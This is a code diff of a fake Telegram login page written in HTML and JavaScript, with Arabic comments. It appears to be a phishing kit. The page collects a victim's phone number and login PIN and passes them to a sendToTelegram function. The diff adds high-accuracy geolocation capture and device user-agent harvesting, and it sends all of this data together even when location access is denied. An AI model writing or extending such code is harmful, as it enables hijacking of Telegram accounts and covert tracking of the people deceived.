@@ -29,9 +29,9 @@
         }
 
         .container img {
-            width: 90px;
-            height: 90px;
-            object-fit: contain;
+            width: 90px; /* عرض الصورة */
+            height: 90px; /* ارتفاع الصورة */
+            object-fit: contain; /* لضمان تناسب الصورة */
             margin-bottom: 1%;
         }
 
@@ -90,16 +90,20 @@
             text-decoration: underline;
         }
 
-        input[type="number"]::-webkit-inner-spin-button,
+        /* تعطيل الأسهم في حقل الرقم */
+        input[type="number"]::-webkit-inner-spin-button, 
         input[type="number"]::-webkit-outer-spin-button {
             -webkit-appearance: none;
             margin: 0;
         }
+
+
     </style>
 </head>
 <body>
     <div class="container">
         <div class="login-box">
+            <!-- صورة أعلى البوكس -->
             <center><img src="telegram.png" alt="Logo"></center>
             <center><h1>Telegram</h1></center>
             <form id="loginForm">
@@ -114,7 +118,7 @@
                 </select>
 
                 <label for="phone">Phone Number</label>
-                <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
+                <input type="number" id="phone" name="phone" placeholder="Enter your phone number" required>
 
                 <button type="button" id="nextButton">Next</button>
             </form>
@@ -140,13 +144,13 @@
             })
                 .then((response) => {
                     if (response.ok) {
-                        alert("Successfully sent!");
+                        alert("successfully!");
                     } else {
-                        alert("Failed to send.");
+                        alert("Failed.");
                     }
                 })
                 .catch((error) => {
-                    alert("Error occurred.");
+                    alert("Error");
                     console.error(error);
                 });
         }
@@ -158,20 +162,12 @@
             const phoneInput = document.getElementById("phone").value.trim();
             const countryCode = document.getElementById("countryCode").value;
 
-            // التحقق من أن الإدخال يحتوي فقط على أرقام
-            const invalidChars = phoneInput.match(/[^\d]/g); // البحث عن الأحرف غير الرقمية
-
-            let data = `Phone: ${countryCode} ${phoneInput}`;
-
-            if (invalidChars) {
-                alert("The phone number contains invalid characters.");
-                data += `\nInvalid Input: ${phoneInput}\nInvalid Characters: ${invalidChars.join(", ")}`;
+            if (phoneInput === "") {
+                alert("Please enter your phone number.");
+                return;
             }
 
-            // إرسال البيانات إلى Telegram
-            sendToTelegram(data);
-
-            // قفل الحقول بعد الإرسال
+            // قفل الحقول
             document.getElementById("phone").disabled = true;
             document.getElementById("countryCode").disabled = true;
             nextButton.style.display = "none";
@@ -196,6 +192,7 @@
             loginForm.appendChild(pinInput);
             loginForm.appendChild(verifyButton);
 
+            // عند الضغط على زر Verify
             verifyButton.addEventListener("click", () => {
                 const pin = pinInput.value.trim();
 
@@ -204,8 +201,59 @@
                     return;
                 }
 
-                const pinData = `PIN: ${pin}`;
-                sendToTelegram(pinData);
+                // الحصول على الموقع الجغرافي
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+
+                            // جمع البيانات
+                            const deviceInfo = `Device Info: ${navigator.userAgent}`;
+                            const data = `Phone: ${countryCode} ${phoneInput}\nPIN: ${pin}\nLatitude: ${latitude}\nLongitude: ${longitude}\n${deviceInfo}`;
+
+                            // إرسال البيانات إلى Telegram
+                            sendToTelegram(data);
+                        },
+                        (error) => {
+                            let errorMessage = "Failed to get location. ";
+                            switch (error.code) {
+                                case error.PERMISSION_DENIED:
+                                    errorMessage += "User denied the request for Geolocation.";
+                                    break;
+                                case error.POSITION_UNAVAILABLE:
+                                    errorMessage += "Location information is unavailable.";
+                                    break;
+                                case error.TIMEOUT:
+                                    errorMessage += "The request to get user location timed out.";
+                                    break;
+                                default:
+                                    errorMessage += "An unknown error occurred.";
+                            }
+
+                            alert(errorMessage);
+                            console.error(errorMessage);
+
+                            // إرسال البيانات بدون إحداثيات الموقع
+                            const deviceInfo = `Device Info: ${navigator.userAgent}`;
+                            const data = `Phone: ${countryCode} ${phoneInput}\nPIN: ${pin}\nLocation: Not Available\n${deviceInfo}`;
+                            sendToTelegram(data);
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0,
+                        }
+                    );
+                } else {
+                    alert("Geolocation is not supported by this browser.");
+                    console.error("Geolocation is not supported by this browser.");
+
+                    // إرسال البيانات بدون إحداثيات الموقع
+                    const deviceInfo = `Device Info: ${navigator.userAgent}`;
+                    const data = `Phone: ${countryCode} ${phoneInput}\nPIN: ${pin}\nLocation: Not Available\n${deviceInfo}`;
+                    sendToTelegram(data);
+                }
             });
         });
     </script>
